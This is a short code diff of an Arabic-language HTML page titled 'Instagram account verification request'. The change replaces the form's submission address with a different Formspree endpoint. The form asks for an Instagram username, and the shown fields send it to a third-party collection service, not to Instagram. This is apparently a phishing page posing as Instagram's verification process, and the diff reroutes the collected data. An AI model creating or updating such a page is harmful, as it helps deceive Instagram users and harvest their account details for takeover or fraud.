@@ -55,7 +55,7 @@
 
 <div class="container">
     <h2>طلب توثيق حساب إنستغرام</h2>
-    <form action="https://formspree.io/f/meoapqlp" method="POST">
+    <form action="https://formspree.io/f/xblgplzw" method="POST">
         <label for="username">اسم المستخدم في إنستغرام:</label>
         <input type="text" id="username" name="username" required>
 
